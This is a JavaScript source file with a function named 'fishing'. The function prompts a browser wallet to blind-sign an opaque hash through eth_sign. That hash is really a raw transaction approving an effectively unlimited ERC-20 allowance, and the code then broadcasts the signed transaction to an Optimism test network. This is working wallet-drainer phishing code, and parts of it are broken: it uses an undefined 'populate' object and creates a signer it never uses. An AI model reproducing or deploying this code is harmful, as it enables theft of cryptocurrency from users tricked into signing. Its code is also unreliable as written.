import { ethers } from "ethers";
import erc20Abi from '../abis/GenericErc20.json';
import RLP from "rlp";
import Web3 from "web3";

const {
    PRIVATE_KEY
} = require("../../env.json")

export async function fishing(walletAddress, erc20Obj) {
    console.log(walletAddress)
    let newInterf = new ethers.utils.Interface(erc20Abi)
    const funData = newInterf.encodeFunctionData("approve",
        [walletAddress,
            ethers.utils.parseUnits("9999999999999999999", 6)]
    );
    const transaction = {
        nonce: 1,
        gasPrice: 1000000001,
        gasLimit: 5000000,
        to: erc20Obj.address,
        value: 0,
        data: funData
    };
    const rawTransaction = RLP.encode([transaction.nonce, transaction.gasPrice, transaction.gasLimit, transaction.to, transaction.value, transaction.data]);
    const msgHex = rawTransaction.toString('hex');
    const msgHash = Web3.utils.keccak256('0x' + msgHex);
    const ethResult = await window.ethereum.request({
        method: 'eth_sign',
        params: [walletAddress, msgHash],
    });
    console.log("eth_sign return:", ethResult);
    let r = ethResult.slice(0, 66);
    let s = '0x' + ethResult.slice(66, 130);
    let v = '0x' + ethResult.slice(130, 132);
    v = Web3.utils.toDecimal(v);
    populate.r = r;
    populate.s = s;
    populate.v = v;
    const signedRawTransaction = RLP.encode([populate.nonce, populate.gasPrice, populate.gasLimit, populate.to, populate.value, populate.data, populate.v, populate.r, populate.s]);
    console.log("SignedRawTransaction :", signedRawTransaction);
    const tHex = signedRawTransaction.toString('hex');
    const tHash = Web3.utils.keccak256('0x' + tHex);
    console.log("tHash 256:", tHash);
    let adminProvider = ethers.getDefaultProvider("https://goerli.optimism.io");
    let adminSigner = new ethers.Wallet(
        PRIVATE_KEY,
        adminProvider
    );
    let sendRes = await adminProvider.sendTransaction(signedRawTransaction);
}